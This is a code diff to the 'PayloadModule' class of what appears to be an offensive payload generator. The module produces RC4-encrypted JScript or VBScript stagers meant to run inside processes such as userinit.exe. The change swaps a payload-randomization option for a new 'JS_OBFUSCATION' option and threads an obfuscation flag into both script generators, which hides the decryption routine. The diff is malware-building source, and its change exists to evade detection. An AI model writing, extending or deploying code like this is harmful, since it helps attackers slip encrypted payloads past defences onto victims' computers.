@@ -43,7 +43,7 @@ class PayloadModule:
             "PROCESS"   :  ["userinit.exe", "Any process from System32/SysWOW64"],
             "SCRIPT_TYPE" : ["JScript", "JScript or VBScript"],
             "ENCRYPTION" : ["X", "Encrypt the payload with RC4"],
-            "SUPPLEMENT_HTML" : ["X", "Automatic payload randomization"]
+            "JS_OBFUSCATION" : ["X", "Obfuscate the javascript decryption routine"]
         }
 
     def generate(self):
@@ -120,7 +120,13 @@ class PayloadModule:
                 encrypted_payload = encryption.rc4(key, payload)
                 encrypted_payload = base64.b64encode(encrypted_payload)
 
-                source_code = code_gen.genRC4JScript(encrypted_payload, key)
+                if self.required_options["JS_OBFUSCATION"][0].lower() != "x":
+                    print("JS_OBFUSCATION: True")
+                    source_code = code_gen.genRC4JScript(encrypted_payload, key, True)
+                
+                else:
+                    print("JS_OBFUSCATION: False")
+                    source_code = code_gen.genRC4JScript(encrypted_payload, key, False)
             
             else:
                 source_code = payload
@@ -151,8 +157,12 @@ class PayloadModule:
                 encrypted_payload = encryption.rc4(key, payload)
                 encrypted_payload = base64.standard_b64encode(bytes(encrypted_payload, "latin-1")).decode("ascii")
 
-                source_code = code_gen.genRC4VBScript(
-                    encrypted_payload, key)
+                if self.required_options["JS_OBFUSCATION"][0].lower() != "x":
+                    source_code = code_gen.genRC4VBScript(
+                        encrypted_payload, key, True)
+                else:
+                    source_code = code_gen.genRC4VBScript(
+                        encrypted_payload, key, False)
             else:
                 source_code = payload
         else:
